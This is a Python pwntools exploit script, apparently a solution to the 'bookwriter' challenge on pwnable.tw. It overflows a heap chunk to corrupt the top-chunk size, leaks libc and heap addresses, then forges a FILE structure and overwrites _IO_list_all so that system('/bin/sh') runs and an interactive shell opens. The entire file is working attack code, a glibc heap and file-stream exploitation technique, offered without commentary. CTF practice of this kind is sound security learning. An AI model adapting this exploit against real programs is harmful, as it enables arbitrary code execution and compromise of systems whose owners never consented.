#!/usr/bin/env python3

from pwn import *

exe = ELF("./bookwriter_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


r = 0

if args.LOCAL:
    r = process([exe.path])
    #gdb.attach(r, gdbscript='''
    #    c   
    #    ''')
else:
    r = remote("chall.pwnable.tw", 10304)

def author(a):
    r.sendafter(b"Author :", a)


def add_page(size, content):
    r.sendlineafter(b"choice :", b"1")
    r.sendlineafter(b"Size of page :", f"{size}".encode())
    r.sendafter(b"Content :", content)

def view_page(index):
    r.sendlineafter(b"choice :", b"2")
    r.sendlineafter(b"Index of page :", f"{index}".encode())
    r.recvuntil(b"Content :\n"+b"C"*8)
    return u64(r.recv(6) + b"\x00\x00")


def edit_page(index, content):
    r.sendlineafter(b"choice :", b"3")
    r.sendlineafter(b"Index of page :", f"{index}".encode())
    r.sendafter(b"Content:", content)

def info_page(new_author, change_author=False):
    r.sendlineafter(b"choice :", b"4")
    r.recvuntil(b"Author : "+b"A"*0x40)
    result = r.recvline()[:-1]
    #print(result)
    
    if change_author:
        r.sendlineafter(b"(yes:1 / no:0) ", b"1")
        author(new_author)
    else:
        r.sendlineafter(b"(yes:1 / no:0) ", b"0")

    return result


def exit_():
    r.sendlineafter(b"choice :", b"5")



def main():
    author(b"A"*0x40)

    add_page(0x58, b"index 0") # index 0
    edit_page(0, b"\x00")




    add_page(0x88, b"A"*0x88) # index 1


    edit_page(1, b"B"*0x88)
    edit_page(1, b"B"*0x88 + b"\x11\x0f\x00")


    add_page(0x1000-8, b"index 2") # index 2

    add_page(0x20-8, b"C"*8) # index 3

    unsorted_bin = view_page(3)
    print("[*] unsorted_bin: ", hex(unsorted_bin))
    libc.address = unsorted_bin - 0x3c4188
    print("[*] libc: ", hex(libc.address))



    result = info_page(b"no")
    chunk_0 = u64(result.ljust(8, b"\x00"))
    print("[*] chunk 0: ", hex(chunk_0))



    for i in range(4, 9):
        add_page(0x20-8, b"C"*8)


    _IO_list_all = libc.sym['_IO_list_all']
    vtable = chunk_0+0x268
    print("[*] _IO_list_all: ", hex(_IO_list_all))


    payload = b"\x00"*0x1a0

    my_fsop = b"/bin/sh\x00"+p64(0x61)
    my_fsop += p64(unsorted_bin)
    my_fsop += p64(_IO_list_all-0x10)
    my_fsop += p64(1)+p64(2)
    my_fsop = my_fsop.ljust(0xc0, b"\x00")
    my_fsop += b"\x00"*24
    my_fsop += p64(vtable)
    my_fsop += p64(libc.sym['system'])

    payload += my_fsop
    edit_page(0, payload)


    r.sendlineafter(b"choice :", b"1")
    r.sendlineafter(b"page :", b"24")
    #add_page(0x18, b"A"*8)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
